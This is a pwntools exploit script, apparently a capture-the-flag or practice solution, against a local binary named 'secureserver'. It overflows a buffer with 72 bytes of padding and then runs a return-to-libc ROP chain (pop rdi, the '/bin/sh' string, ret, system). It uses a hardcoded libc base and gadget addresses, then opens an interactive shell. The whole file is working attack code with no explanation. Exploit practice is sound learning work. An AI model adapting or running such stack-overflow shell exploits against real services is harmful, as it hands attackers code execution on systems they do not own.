from pwn import *

exe = './secureserver'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

io = process()
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x00007ffff7dbd000 # Found from LDD

# system and sh
system = libc.functions.system
binsh = next(libc.search(b'/bin/sh'))
info("system addr at %#x", system)
info("shell at %#x", binsh)

pop_rdi = 0x40120b # Found with ropper
ret = 0x401016 # Found with ropper

padding = 72
payload = flat(
    asm('nop') * padding,
    pop_rdi, 
    binsh, 
    ret,
    system
)
io.sendlineafter(b':', payload)
io.interactive()